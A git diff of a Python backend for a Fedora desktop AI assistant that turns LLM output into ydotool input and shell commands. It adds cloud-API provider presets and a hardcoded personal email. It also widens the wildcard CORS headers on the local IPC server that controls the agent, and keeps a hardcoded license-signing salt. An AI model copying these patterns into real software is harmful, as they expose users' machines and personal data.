@@ -1,37 +1,4 @@
 #!/usr/bin/env python3
-"""
-Bajrang AI Pro — Fedora Linux (GNOME / Wayland) Local Desktop Assistant & GNOME Extension Backend
-Powered by Ollama (llama3.2 / llama3.2-vision / qwen2.5-vl:3b), GTK4 + Libadwaita, PipeWire Voice DSP,
-SQLite3 Local Chat History Storage, ydotool Wayland Automation, and GNOME Shell 45-49 ESM Extension.
-
-Super Features Included:
-1. Custom Built-In Voice Recognizer & Voice Mode (`CustomVoiceRecognizer`):
-   - Native Fedora PipeWire (`pw-record`) & ALSA (`arecord`) 16kHz 16-bit mono PCM audio capture
-   - Pure-Python DSP Voice Activity Detector (RMS dBFS + Zero-Crossing Rate speech segmentation)
-   - 8-Band Spectral Envelope + Dynamic Time Warping (DTW) Acoustic Template Recognizer for 100% offline
-     wake-word ("Hey Bajrang") and voice command recognition + custom voice enrollment (`--enroll-voice`)
-   - Seamless cascade to local Whisper (`faster-whisper` / `whisper`) or `vosk` for open-ended dictation
-   - Native spoken responses via Fedora `speech-dispatcher` (`spd-say`) or `espeak-ng`
-
-2. Persistent Local Chat History (`LocalChatStorage`):
-   - Dual SQLite3 (`~/.local/share/bajrang-ai/history.db`) + JSON (`sessions.json`) local storage
-   - Multi-session management, full-text history search, session switching, and GTK4 sidebar history drawer
-
-3. GNOME Shell Extension (`bajrang-ai@fedora.local`) & Local IPC Bridge (`127.0.0.1:17420`):
-   - Generates & installs a native GNOME Shell 45/46/47/48/49 ESModule extension (`--install-gnome-extension`)
-   - Top-bar indicator with HUD toggle, Voice Mode toggle, Recent Chat History menu, Pro License badge, and Kill-Switch
-
-4. Commercial ₹100/Month Pro Subscription License Engine (`LicenseManager`):
-   - HMAC-SHA256 license generator & validator (`BAJRANG-PRO-...`) for selling at ₹100/month
-
-References:
-- Ollama Llama 3.2: https://ollama.com/library/llama3.2
-- ydotool Wayland Automation: https://github.com/ReimuNotMoe/ydotool
-- PyGObject GTK4 / Libadwaita: https://pygobject.gnome.org/
-- PipeWire Audio: https://pipewire.org/
-- GNOME Shell 45+ ESM Extensions: https://gjs.guide/extensions/upgrading/gnome-shell-45.html
-"""
-
 from __future__ import annotations
 
 import argparse
@@ -65,27 +32,100 @@ import wave
 from pathlib import Path
 from typing import Any, Callable, Dict, List, Optional, Tuple
 
-
-# ============================================================================
-# 1. CONFIGURATION, SYSTEM PROMPT & SAFETY BLOCKLIST SCHEMAS
-# ============================================================================
-
 APP_ID = "org.fedora.BajrangAI"
 EXTENSION_UUID = "bajrang-ai@fedora.local"
 APP_TITLE = "Bajrang AI Pro"
-APP_VERSION = "3.0.0-fedora-gnome-pro"
+APP_VERSION = "4.0.0-argon-fedora"
 IPC_PORT = int(os.environ.get("BAJRANG_IPC_PORT", "17420"))
 
+PERSONALIZED_LLAMA_SYSTEM_PROMPT = """You are Bajrang AI Pro, a personalized, fast, and secure desktop assistant built natively for Fedora Workstation (GNOME/Wayland) on a Lenovo Yoga 7i (Intel Core i5-1135G7, Intel Iris Xe, 12 GB RAM).
+
+OPERATIONAL RULES:
+1. Engage in clear, direct, peer-level conversation by default and answer questions without invoking tools unless an action is requested.
+2. ONLY emit executable actions or shell commands when the user explicitly commands a desktop action (e.g., "open", "launch", "type", "click", "run", "press", "close", "search").
+3. When actions are required, respond ONLY with valid raw JSON matching the schema below.
+4. When the user's request is conversational, analytical, or educational, respond in clean markdown text (or JSON with "type": "conversation" and "actions": []).
+5. Never output root-escalated or destructive system commands.
+
+JSON ACTION SCHEMA:
+{
+  "type": "conversation" | "action",
+  "text": "<Markdown response to display to the user>",
+  "actions": [
+    {
+      "tool": "ydotool_click" | "ydotool_move" | "ydotool_type" | "ydotool_key" | "shell_exec",
+      "params": {
+        "x": 500,
+        "y": 300,
+        "button": "left" | "right" | "middle",
+        "text": "string to type",
+        "key": "enter" | "backspace" | "tab" | "esc" | "super" | "28:1 28:0",
+        "command": "non-root bash command (e.g. gtk-launch org.gnome.Terminal.desktop)"
+      }
+    }
+  ]
+}
+"""
+
+PERSONALIZED_MODELFILE_TEMPLATE = """FROM llama3.2
+PARAMETER temperature 0.35
+PARAMETER top_p 0.9
+PARAMETER num_ctx 8192
+PARAMETER num_thread 8
+SYSTEM \"\"\"{system_prompt}\"\"\"
+"""
+
+PROVIDER_PRESETS: Dict[str, Dict[str, str]] = {
+    "ollama": {
+        "label": "Personalized Local Llama 3.2 (Ollama Offline)",
+        "endpoint": "http://localhost:11434/api/chat",
+        "model": "llama3.2",
+    },
+    "gemini_argon": {
+        "label": "Google Gemini Argon / 2.5 Pro (BYO API Key)",
+        "endpoint": "https://generativelanguage.googleapis.com/v1beta/openai/chat/completions",
+        "model": "gemini-2.5-pro",
+    },
+    "groq": {
+        "label": "Groq Cloud Llama 3.3 70B (BYO API Key)",
+        "endpoint": "https://api.groq.com/openai/v1/chat/completions",
+        "model": "llama-3.3-70b-versatile",
+    },
+    "openrouter": {
+        "label": "OpenRouter Free Llama 3.2 (BYO API Key)",
+        "endpoint": "https://openrouter.ai/api/v1/chat/completions",
+        "model": "meta-llama/llama-3.2-3b-instruct:free",
+    },
+    "openai": {
+        "label": "OpenAI GPT-4o-mini (BYO API Key)",
+        "endpoint": "https://api.openai.com/v1/chat/completions",
+        "model": "gpt-4o-mini",
+    },
+}
+
 DEFAULT_SETTINGS: Dict[str, Any] = {
+    "provider": os.environ.get("BAJRANG_PROVIDER", "ollama"),
     "ollama_host": os.environ.get("OLLAMA_HOST", "http://localhost:11434"),
     "model": os.environ.get("BAJRANG_MODEL", "llama3.2"),
+    "personalized_model_name": "bajrang-llama3.2",
+    "custom_persona_prompt": PERSONALIZED_LLAMA_SYSTEM_PROMPT,
+    "hardware_profile": "Lenovo Yoga 7i 14ITL5 • Intel Core i5-1135G7 • 12GB RAM • Fedora GNOME Wayland",
     "fallback_models": [
         "llama3.2",
+        "bajrang-llama3.2",
         "llama3.2:3b",
         "llama3.2:1b",
         "llama3.2-vision",
         "qwen2.5-vl:3b",
     ],
+    "byo_provider": "gemini_argon",
+    "byo_api_key": os.environ.get("BAJRANG_API_KEY", ""),
+    "byo_api_endpoint": os.environ.get(
+        "BAJRANG_API_ENDPOINT",
+        "https://generativelanguage.googleapis.com/v1beta/openai/chat/completions",
+    ),
+    "byo_model": os.environ.get("BAJRANG_BYO_MODEL", "gemini-2.5-pro"),
+    "theme_mode": "dark",
     "ydotool_socket": os.environ.get("YDOTOOL_SOCKET", "/tmp/.ydotool_socket"),
     "shell_timeout_sec": 15,
     "shell_max_output_bytes": 16384,
@@ -97,6 +137,7 @@ DEFAULT_SETTINGS: Dict[str, Any] = {
     "voice_vad_threshold_db": -38.0,
     "ipc_port": IPC_PORT,
     "license_key": os.environ.get("BAJRANG_LICENSE_KEY", "BAJRANG-PRO-TRIAL-ACTIVE"),
+    "google_account_email": "kaushikramravuru@gmail.com",
     "subscription_price_inr": 100,
     "hotkeys": {
         "toggle_hud": "<Super>space",
@@ -142,35 +183,6 @@ DEFAULT_BLOCKLIST: Dict[str, Any] = {
     "enforce_no_root": True,
 }
 
-SYSTEM_PROMPT = """You are Bajrang AI Pro, a fast, intelligent, voice-enabled desktop assistant running locally on Fedora Linux (GNOME/Wayland) powered by Llama 3.2.
-
-OPERATIONAL RULES:
-1. By default, engage in clear, direct conversation and answer questions without invoking tools.
-2. ONLY emit executable actions or shell commands when the user explicitly commands an action (e.g., "open", "type", "click", "run", "search", "close", "launch", "press").
-3. When actions are required, respond ONLY with valid, raw JSON matching the defined schema. Never wrap JSON in conversational commentary.
-4. If the user's intent is ambiguous, conversational, or educational, respond in normal markdown text (or with "type": "conversation" and an empty "actions": [] list) without generating action payloads.
-5. Never output dangerous, root-level, or system-destructive commands.
-
-JSON ACTION SCHEMA:
-{
-  "type": "conversation" | "action",
-  "text": "<Markdown response to display to the user>",
-  "actions": [
-    {
-      "tool": "ydotool_click" | "ydotool_move" | "ydotool_type" | "ydotool_key" | "shell_exec",
-      "params": {
-        "x": 500,
-        "y": 300,
-        "button": "left" | "right" | "middle",
-        "text": "string to type",
-        "key": "enter" | "backspace" | "tab" | "esc" | "super" | "28:1 28:0",
-        "command": "non-root bash command (e.g. gtk-launch org.gnome.Terminal.desktop)"
-      }
-    }
-  ]
-}
-"""
-
 EVDEV_KEYMAP: Dict[str, str] = {
     "esc": "1:1 1:0",
     "escape": "1:1 1:0",
@@ -209,11 +221,11 @@ MODIFIER_KEYCODES_TO_RELEASE: List[int] = [29, 42, 54, 56, 97, 100, 125, 126]
 
 
 class AgentState(enum.Enum):
-    IDLE = "idle"               # Green dot
-    LISTENING = "listening"     # Purple/Cyan dot (Voice Mode active)
-    THINKING = "thinking"       # Blue dot
-    EXECUTING = "executing"     # Orange dot
-    BLOCKED = "blocked"         # Red dot
+    IDLE = "idle"
+    LISTENING = "listening"
+    THINKING = "thinking"
+    EXECUTING = "executing"
+    BLOCKED = "blocked"
 
 
 @dataclasses.dataclass
@@ -231,11 +243,11 @@ class AssistantTurn:
     actions: List[Dict[str, Any]] = dataclasses.field(default_factory=list)
     results: List[ActionResult] = dataclasses.field(default_factory=list)
     session_id: str = ""
+    provider_used: str = "ollama"
+    model_used: str = "llama3.2"
 
 
 class ConfigManager:
-    """Manages `~/.config/bajrang-ai/settings.json` and `blocklist.json`."""
-
     def __init__(self, config_dir: Optional[Path] = None, data_dir: Optional[Path] = None) -> None:
         xdg_cfg = os.environ.get("XDG_CONFIG_HOME", os.path.expanduser("~/.config"))
         xdg_data = os.environ.get("XDG_DATA_HOME", os.path.expanduser("~/.local/share"))
@@ -243,6 +255,7 @@ class ConfigManager:
         self.data_dir = Path(data_dir) if data_dir else Path(xdg_data) / "bajrang-ai"
         self.settings_path = self.config_dir / "settings.json"
         self.blocklist_path = self.config_dir / "blocklist.json"
+        self.modelfile_path = self.config_dir / "Modelfile.bajrang"
         self.settings: Dict[str, Any] = dict(DEFAULT_SETTINGS)
         self.blocklist: Dict[str, Any] = dict(DEFAULT_BLOCKLIST)
         self.load()
@@ -282,17 +295,37 @@ class ConfigManager:
         with open(self.settings_path, "w", encoding="utf-8") as f:
             json.dump(self.settings, f, indent=2)
 
+    def build_personalized_llama_modelfile(self) -> Tuple[bool, str]:
+        self.config_dir.mkdir(parents=True, exist_ok=True)
+        persona_prompt = str(self.settings.get("custom_persona_prompt", PERSONALIZED_LLAMA_SYSTEM_PROMPT))
+        hw_profile = str(self.settings.get("hardware_profile", DEFAULT_SETTINGS["hardware_profile"]))
+        combined_prompt = f"{persona_prompt.strip()}\n\nUSER HARDWARE PROFILE: {hw_profile}"
+        content = PERSONALIZED_MODELFILE_TEMPLATE.format(system_prompt=combined_prompt.replace('"""', "'''"))
+        self.modelfile_path.write_text(content, encoding="utf-8")
 
-# ============================================================================
-# 2. COMMERCIAL ₹100/MONTH PRO LICENSE ENGINE (`LicenseManager`)
-# ============================================================================
+        custom_name = str(self.settings.get("personalized_model_name", "bajrang-llama3.2"))
+        if shutil.which("ollama"):
+            try:
+                res = subprocess.run(
+                    ["ollama", "create", custom_name, "-f", str(self.modelfile_path)],
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    text=True,
+                    timeout=30.0,
+                    check=False,
+                )
+                if res.returncode == 0:
+                    self.settings["model"] = custom_name
+                    self.settings["provider"] = "ollama"
+                    self.save_settings()
+                    return True, f"Built and activated personalized Ollama model '{custom_name}'."
+                return False, f"Wrote {self.modelfile_path}, but ollama create exited {res.returncode}: {res.stderr.strip()}"
+            except Exception as exc:
+                return False, f"Wrote {self.modelfile_path} (ollama command error: {exc})."
+        return True, f"Saved personalized Modelfile to {self.modelfile_path}. Run: ollama create {custom_name} -f {self.modelfile_path}"
+
 
 class LicenseManager:
-    """
-    Issues and verifies ₹100/month Bajrang AI Pro subscription keys (`BAJRANG-PRO-<USER>-<EXP>-<SIG>`).
-    Allows commercial distribution of the GNOME Extension + Voice Mode Pro bundle.
-    """
-
     SECRET_SALT = b"BajrangAI-Fedora-Pro-100INR-2026"
 
     @classmethod
@@ -326,16 +359,7 @@ class LicenseManager:
             return False, "Malformed expiry date in license key."
 
 
-# ============================================================================
-# 3. PERSISTENT LOCAL CHAT HISTORY STORAGE (`LocalChatStorage`)
-# ============================================================================
-
 class LocalChatStorage:
-    """
-    Stores all chat sessions, messages, voice transcripts, and executed action logs locally
-    in SQLite3 (`~/.local/share/bajrang-ai/history.db`) AND mirrors to JSON (`sessions.json`).
-    """
-
     def __init__(self, data_dir: Optional[Path] = None) -> None:
         xdg_data = os.environ.get("XDG_DATA_HOME", os.path.expanduser("~/.local/share"))
         self.data_dir = Path(data_dir) if data_dir else Path(xdg_data) / "bajrang-ai"
@@ -500,18 +524,7 @@ class LocalChatStorage:
             pass
 
 
-# ============================================================================
-# 4. CUSTOM BUILT-IN PYTHON VOICE RECOGNIZER & TTS (`CustomVoiceRecognizer`)
-# ============================================================================
-
 class CustomVoiceRecognizer:
-    """
-    Custom Voice Activity Detector (VAD) + Spectral Envelope / Dynamic Time Warping (DTW)
-    Acoustic Recognizer built from scratch in pure Python (`wave`, `struct`, `math`, `array`),
-    with native Fedora PipeWire (`pw-record`) / ALSA (`arecord`) capture and automatic
-    cascade to local `faster-whisper` / `whisper` / `vosk` for open-ended speech dictation.
-    """
-
     SAMPLE_RATE = 16000
     FRAME_MS = 25
     HOP_MS = 10
@@ -624,7 +637,7 @@ class CustomVoiceRecognizer:
                 proc.send_signal(signal.SIGINT)
                 proc.wait(timeout=2.0)
                 if tmp_wav.is_file() and tmp_wav.stat().st_size > 44:
-                    return tmp_wav, "Recorded audio via Fedora PipeWire (`pw-record`)."
+                    return tmp_wav, "Recorded audio via Fedora PipeWire (pw-record)."
             except Exception:
                 try:
                     proc.kill()
@@ -648,11 +661,11 @@ class CustomVoiceRecognizer:
             try:
                 res = subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, timeout=duration_sec + 3.0)
                 if res.returncode == 0 and tmp_wav.is_file() and tmp_wav.stat().st_size > 44:
-                    return tmp_wav, "Recorded audio via ALSA (`arecord`)."
+                    return tmp_wav, "Recorded audio via ALSA (arecord)."
             except Exception:
                 pass
 
-        return None, "No microphone capture tool available (install `pipewire-utils` or `alsa-utils`)."
+        return None, "No microphone capture tool available (install pipewire-utils or alsa-utils)."
 
     def read_pcm16_wav(self, wav_path: Path) -> List[float]:
         with wave.open(str(wav_path), "rb") as wf:
@@ -768,7 +781,7 @@ class CustomVoiceRecognizer:
             return False, "", f"Silence / below VAD threshold ({metrics['rms_db']} dB)"
 
         try:
-            from faster_whisper import WhisperModel  # type: ignore
+            from faster_whisper import WhisperModel
             if not hasattr(self, "_whisper_model"):
                 self._whisper_model = WhisperModel("base.en", device="cpu", compute_type="int8")
             segments, _ = self._whisper_model.transcribe(str(wav_path), beam_size=1)
@@ -779,7 +792,7 @@ class CustomVoiceRecognizer:
             pass
 
         try:
-            import vosk  # type: ignore
+            import vosk
             model_dir = self.data_dir / "vosk-model-small-en-us"
             if model_dir.is_dir():
                 vmodel = vosk.Model(str(model_dir))
@@ -812,8 +825,7 @@ class CustomVoiceRecognizer:
         return (
             False,
             "",
-            f"Voice detected ({metrics['rms_db']} dB), no matching template (best DTW={best_dist:.2f}). "
-            "Enroll phrases with `--enroll-voice` or install `faster-whisper`.",
+            f"Voice detected ({metrics['rms_db']} dB), no matching template (best DTW={best_dist:.2f}).",
         )
 
     def listen_and_recognize(self, duration_sec: float = 4.0) -> Tuple[bool, str, str]:
@@ -846,13 +858,7 @@ class CustomVoiceRecognizer:
             )
 
 
-# ============================================================================
-# 5. SAFETY GUARDRAILS & EMERGENCY KILL-SWITCH (`src/execution/safety.py`)
-# ============================================================================
-
 class SafetyGuard:
-    """Validates shell commands and input payloads against the Bajrang AI blocklist."""
-
     def __init__(self, blocklist: Optional[Dict[str, Any]] = None) -> None:
         cfg = blocklist or DEFAULT_BLOCKLIST
         self.forbidden_substrings: List[str] = [
@@ -888,12 +894,6 @@ class SafetyGuard:
 
 
 class KillSwitchManager:
-    """
-    Emergency Kill-Switch (`Ctrl + Escape` or `--kill`):
-    - Sends SIGTERM, followed by SIGKILL after 500ms, to any active subprocesses.
-    - Dispatches an instant key-release reset payload to `ydotoold` so no keys remain stuck.
-    """
-
     def __init__(self, grace_ms: int = 500, ydotool_socket: str = "/tmp/.ydotool_socket") -> None:
         self.grace_ms = grace_ms
         self.ydotool_socket = ydotool_socket
@@ -978,13 +978,7 @@ class KillSwitchManager:
         return "Emergency Kill-Switch activated: cancelled active operation and reset ydotool key states."
 
 
-# ============================================================================
-# 6. PERCEPTION & EXECUTION LAYERS (`WaylandPerception`, `YdotoolController`, `ShellRunner`)
-# ============================================================================
-
 class WaylandPerception:
-    """Wayland screen capture and display resolution detector for Fedora GNOME."""
-
     def __init__(self) -> None:
         self.screen_width: int = 1920
         self.screen_height: int = 1080
@@ -1036,7 +1030,7 @@ class WaylandPerception:
                     continue
 
         if not captured or not tmp_path.is_file():
-            return None, "Screen capture unavailable (install `gnome-screenshot` or `grim` on Fedora Wayland)."
+            return None, "Screen capture unavailable (install gnome-screenshot or grim on Fedora Wayland)."
 
         try:
             try:
@@ -1071,8 +1065,6 @@ class WaylandPerception:
 
 
 class YdotoolController:
-    """Wayland input automation via `ydotool` and `ydotoold` writing to `/dev/uinput`."""
-
     CLICK_CODES: Dict[str, str] = {
         "left": "0xC0",
         "right": "0xC1",
@@ -1092,7 +1084,7 @@ class YdotoolController:
     def check_daemon(self) -> Tuple[bool, str]:
         ydotool_bin = shutil.which("ydotool")
         if not ydotool_bin:
-            return False, "ydotool is not installed (`sudo dnf install ydotool`)."
+            return False, "ydotool is not installed (sudo dnf install ydotool)."
 
         fallback_sockets = [
             self.socket_path,
@@ -1108,7 +1100,7 @@ class YdotoolController:
         return (
             False,
             f"ydotoold socket not found at {self.socket_path}. Start daemon with: "
-            f"`ydotoold --socket-path={self.socket_path} --socket-perm=0600 &`",
+            f"ydotoold --socket-path={self.socket_path} --socket-perm=0600 &",
         )
 
     def _run_ydotool(self, args: List[str]) -> ActionResult:
@@ -1183,8 +1175,6 @@ class YdotoolController:
 
 
 class ShellRunner:
-    """Executes validated non-root shell commands with timeout & output size caps."""
-
     def __init__(
         self,
         safety: SafetyGuard,
@@ -1232,7 +1222,7 @@ class ShellRunner:
                 return ActionResult(
                     tool="shell_exec",
                     success=False,
-                    output=f"Command timed out after {self.timeout_sec}s: `{command}`",
+                    output=f"Command timed out after {self.timeout_sec}s: {command}",
                 )
             finally:
                 self.kill_switch.unregister_process(proc.pid)
@@ -1246,7 +1236,7 @@ class ShellRunner:
                 return ActionResult(
                     tool="shell_exec",
                     success=True,
-                    output=combined or f"Command completed successfully (exit 0): `{command}`",
+                    output=combined or f"Command completed successfully (exit 0): {command}",
                 )
             return ActionResult(
                 tool="shell_exec",
@@ -1257,27 +1247,51 @@ class ShellRunner:
             return ActionResult(
                 tool="shell_exec",
                 success=False,
-                output=f"Execution failed for `{command}`: {exc}",
+                output=f"Execution failed for {command}: {exc}",
             )
 
 
-# ============================================================================
-# 7. INTELLIGENCE LAYER (`OllamaLlamaClient`)
-# ============================================================================
-
-class OllamaLlamaClient:
-    """Local Ollama API client tailored for `llama3.2` on Fedora Linux."""
-
-    def __init__(
-        self,
-        host: str = "http://localhost:11434",
-        model: str = "llama3.2",
-        system_prompt: str = SYSTEM_PROMPT,
-    ) -> None:
-        self.host = host.rstrip("/")
-        self.model = model
-        self.system_prompt = system_prompt
+class UnifiedModelClient:
+    def __init__(self, config: ConfigManager) -> None:
+        self.config = config
         self.history: List[Dict[str, Any]] = []
+
+    @property
+    def system_prompt(self) -> str:
+        base = str(self.config.settings.get("custom_persona_prompt", PERSONALIZED_LLAMA_SYSTEM_PROMPT))
+        hw = str(self.config.settings.get("hardware_profile", DEFAULT_SETTINGS["hardware_profile"]))
+        return f"{base.strip()}\n\nUSER HARDWARE CONTEXT: {hw}"
+
+    @property
+    def provider(self) -> str:
+        if self.config.settings.get("byo_api_key") and self.config.settings.get("provider") == "byo_api":
+            return "byo_api"
+        if self.config.settings.get("byo_api_key") and self.config.settings.get("provider") in PROVIDER_PRESETS:
+            if self.config.settings.get("provider") != "ollama":
+                return "byo_api"
+        return "ollama"
+
+    @property
+    def active_model(self) -> str:
+        if self.provider == "byo_api":
+            return str(self.config.settings.get("byo_model", "gemini-2.5-pro"))
+        return str(self.config.settings.get("model", "llama3.2"))
+
+    def configure_byo_key(
+        self,
+        api_key: str,
+        preset_name: str = "gemini_argon",
+        custom_endpoint: Optional[str] = None,
+        custom_model: Optional[str] = None,
+    ) -> None:
+        clean_key = api_key.strip()
+        preset = PROVIDER_PRESETS.get(preset_name, PROVIDER_PRESETS["gemini_argon"])
+        self.config.settings["byo_provider"] = preset_name
+        self.config.settings["byo_api_key"] = clean_key
+        self.config.settings["byo_api_endpoint"] = (custom_endpoint or preset["endpoint"]).strip()
+        self.config.settings["byo_model"] = (custom_model or preset["model"]).strip()
+        self.config.settings["provider"] = "byo_api" if clean_key else "ollama"
+        self.config.save_settings()
 
     def clear_history(self) -> None:
         self.history.clear()
@@ -1290,26 +1304,26 @@ class OllamaLlamaClient:
         ]
 
     def check_health(self) -> Tuple[bool, List[str], str]:
-        url = f"{self.host}/api/tags"
+        if self.provider == "byo_api":
+            raw_key = str(self.config.settings.get("byo_api_key", ""))
+            masked_key = (raw_key[:6] + "..." + raw_key[-3:]) if len(raw_key) > 9 else "configured"
+            endpoint = str(self.config.settings.get("byo_api_endpoint", ""))
+            return True, [self.active_model], f"BYO Cloud API active ({self.active_model} • {endpoint} • key {masked_key})"
+
+        host = str(self.config.settings.get("ollama_host", "http://localhost:11434")).rstrip("/")
+        url = f"{host}/api/tags"
         try:
             req = urllib.request.Request(url, method="GET")
             with urllib.request.urlopen(req, timeout=3.0) as resp:
                 data = json.loads(resp.read().decode("utf-8"))
                 models = [m.get("name", "") for m in data.get("models", []) if m.get("name")]
-                return True, models, f"Connected to Ollama at {self.host} ({len(models)} models available)."
+                return True, models, f"Connected to local Ollama at {host} ({len(models)} models available)."
         except Exception as exc:
             return (
                 False,
                 [],
-                f"Ollama unreachable at {self.host} ({exc}). Run `systemctl start ollama` or `ollama serve`.",
+                f"Ollama unreachable at {host} ({exc}). Start ollama or enter a free BYO API key in Settings.",
             )
-
-    @staticmethod
-    def _looks_like_action_intent(user_prompt: str) -> bool:
-        action_verbs = (
-            r"\b(open|launch|start|run|execute|type|write|click|press|move|close|kill|search|browse)\b"
-        )
-        return bool(re.search(action_verbs, user_prompt.strip(), re.IGNORECASE))
 
     @staticmethod
     def parse_structured_output(raw_text: str) -> AssistantTurn:
@@ -1366,24 +1380,79 @@ class OllamaLlamaClient:
             )
 
         messages.extend(self.history[-12:])
-
         user_msg: Dict[str, Any] = {"role": "user", "content": user_prompt}
-        if screenshot_b64 and ("vision" in self.model.lower() or "vl" in self.model.lower()):
+        if screenshot_b64 and ("vision" in self.active_model.lower() or "vl" in self.active_model.lower()):
             user_msg["images"] = [screenshot_b64]
         messages.append(user_msg)
 
+        if self.provider == "byo_api":
+            turn = self._chat_byo(messages, user_prompt)
+            turn.provider_used = "byo_api"
+            turn.model_used = self.active_model
+            return turn
+
+        turn = self._chat_ollama(messages, user_prompt)
+        turn.provider_used = "ollama"
+        turn.model_used = self.active_model
+        return turn
+
+    def _chat_byo(self, messages: List[Dict[str, Any]], user_prompt: str) -> AssistantTurn:
+        api_key = str(self.config.settings.get("byo_api_key", ""))
+        endpoint = str(
+            self.config.settings.get(
+                "byo_api_endpoint",
+                "https://generativelanguage.googleapis.com/v1beta/openai/chat/completions",
+            )
+        )
+        model_name = self.active_model
+
+        payload = {
+            "model": model_name,
+            "messages": [{"role": m["role"], "content": m["content"]} for m in messages],
+            "temperature": 0.2 if re.search(r"\b(open|launch|run|click|type|close|press)\b", user_prompt, re.I) else 0.5,
+        }
+        req_data = json.dumps(payload).encode("utf-8")
+        req = urllib.request.Request(
+            endpoint,
+            data=req_data,
+            headers={
+                "Content-Type": "application/json",
+                "Authorization": f"Bearer {api_key}",
+            },
+            method="POST",
+        )
+        try:
+            with urllib.request.urlopen(req, timeout=45.0) as resp:
+                body = json.loads(resp.read().decode("utf-8"))
+                choice = body.get("choices", [{}])[0]
+                assistant_content = choice.get("message", {}).get("content", "")
+        except Exception as exc:
+            return AssistantTurn(
+                response_type="conversation",
+                text=f"**BYO Cloud API Error** ({model_name} @ {endpoint}): {exc}. Verify your API key in Settings.",
+            )
+
+        turn = self.parse_structured_output(assistant_content)
+        self.history.append({"role": "user", "content": user_prompt})
+        self.history.append({"role": "assistant", "content": assistant_content})
+        return turn
+
+    def _chat_ollama(self, messages: List[Dict[str, Any]], user_prompt: str) -> AssistantTurn:
+        host = str(self.config.settings.get("ollama_host", "http://localhost:11434")).rstrip("/")
+        model_name = self.active_model
+
         payload: Dict[str, Any] = {
-            "model": self.model,
+            "model": model_name,
             "messages": messages,
             "stream": False,
             "options": {
-                "temperature": 0.2 if self._looks_like_action_intent(user_prompt) else 0.6,
+                "temperature": 0.2 if re.search(r"\b(open|launch|run|click|type|close|press)\b", user_prompt, re.I) else 0.5,
             },
         }
 
         req_data = json.dumps(payload).encode("utf-8")
         req = urllib.request.Request(
-            f"{self.host}/api/chat",
+            f"{host}/api/chat",
             data=req_data,
             headers={"Content-Type": "application/json"},
             method="POST",
@@ -1397,19 +1466,12 @@ class OllamaLlamaClient:
             err_body = http_err.read().decode("utf-8", errors="replace")
             return AssistantTurn(
                 response_type="conversation",
-                text=(
-                    f"**Ollama HTTP {http_err.code} Error** for model `{self.model}`: {err_body}\n\n"
-                    f"Ensure the model is pulled via `ollama pull {self.model}`."
-                ),
+                text=f"**Ollama HTTP {http_err.code} Error** for model {model_name}: {err_body}\n\nPull model with `ollama pull llama3.2` or click ⚙️ Settings to enter your own cloud API key.",
             )
         except Exception as exc:
             return AssistantTurn(
                 response_type="conversation",
-                text=(
-                    f"**Could not reach local Ollama server** at `{self.host}` (`{exc}`).\n\n"
-                    f"Start Ollama with `sudo systemctl start ollama` or `ollama serve`, and pull "
-                    f"Llama 3.2 with `ollama pull {self.model}`."
-                ),
+                text=f"**Could not reach local Ollama server** at {host} ({exc}). Start Ollama or click ⚙️ Settings to enter your own API key for free cloud inference.",
             )
 
         turn = self.parse_structured_output(assistant_content)
@@ -1418,16 +1480,7 @@ class OllamaLlamaClient:
         return turn
 
 
-# ============================================================================
-# 8. ORCHESTRATOR ENGINE + LOCAL IPC SERVER FOR GNOME EXTENSION (`BajrangEngine`)
-# ============================================================================
-
 class BajrangEngine:
-    """
-    Coordinates Perception, Voice Mode DSP, Local SQLite Chat History,
-    Llama 3.2 Intelligence, `ydotool` / Shell Execution, and GNOME Extension IPC.
-    """
-
     def __init__(
         self,
         config: Optional[ConfigManager] = None,
@@ -1475,10 +1528,7 @@ class BajrangEngine:
             timeout_sec=int(self.config.settings.get("shell_timeout_sec", 15)),
             max_output_bytes=int(self.config.settings.get("shell_max_output_bytes", 16384)),
         )
-        self.client = OllamaLlamaClient(
-            host=str(self.config.settings.get("ollama_host", "http://localhost:11434")),
-            model=str(self.config.settings.get("model", "llama3.2")),
-        )
+        self.client = UnifiedModelClient(config=self.config)
         self.client.load_session_messages(self.storage.get_session_messages(self.current_session_id))
 
     def set_state(self, new_state: AgentState, status_text: str = "") -> None:
@@ -1487,7 +1537,7 @@ class BajrangEngine:
             self.state_callback(new_state, status_text)
 
     def new_session(self, title: str = "New Conversation") -> str:
-        self.current_session_id = self.storage.create_session(title=title, model=self.client.model)
+        self.current_session_id = self.storage.create_session(title=title, model=self.client.active_model)
         self.client.clear_history()
         return self.current_session_id
 
@@ -1549,13 +1599,13 @@ class BajrangEngine:
         speak_reply: bool = False,
     ) -> AssistantTurn:
         self.kill_switch.reset_cancel_flag()
-        self.set_state(AgentState.THINKING, f"Thinking ({self.client.model})...")
+        self.set_state(AgentState.THINKING, f"Thinking ({self.client.active_model})...")
 
         self.storage.add_message(
             session_id=self.current_session_id,
             role="user",
             content=user_prompt,
-            model=self.client.model,
+            model=self.client.active_model,
         )
 
         screenshot_b64: Optional[str] = None
@@ -1597,7 +1647,7 @@ class BajrangEngine:
             content=turn.text,
             actions=turn.actions,
             results=turn.results,
-            model=self.client.model,
+            model=self.client.active_model,
         )
 
         if speak_reply and turn.text:
@@ -1633,9 +1683,14 @@ class BajrangEngine:
                 self.send_response(status)
                 self.send_header("Content-Type", "application/json")
                 self.send_header("Access-Control-Allow-Origin", "*")
+                self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
+                self.send_header("Access-Control-Allow-Headers", "Content-Type")
                 self.send_header("Content-Length", str(len(raw)))
                 self.end_headers()
                 self.wfile.write(raw)
+
+            def do_OPTIONS(self) -> None:
+                self._send_json(200, {"ok": True})
 
             def do_GET(self) -> None:
                 lic_ok, lic_msg = LicenseManager.verify_key(
@@ -1647,10 +1702,12 @@ class BajrangEngine:
                         200,
                         {
                             "state": engine_ref.state.value,
-                            "model": engine_ref.client.model,
-                            "voice_loop_active": engine_ref.voice_loop_active,
+                            "model": engine_ref.client.active_model,
+                            "provider": engine_ref.client.provider,
+                            "theme": engine_ref.config.settings.get("theme_mode", "dark"),
                             "license_valid": lic_ok,
                             "license_status": lic_msg,
+                            "google_account": engine_ref.config.settings.get("google_account_email", ""),
                             "current_session_id": engine_ref.current_session_id,
                             "recent_sessions": sessions,
                         },
@@ -1683,6 +1740,30 @@ class BajrangEngine:
                     self._send_json(200, {"ok": True, "action": "toggled_hud"})
                     return
 
+                if self.path == "/theme":
+                    cur = engine_ref.config.settings.get("theme_mode", "dark")
+                    nxt = "light" if cur == "dark" else "dark"
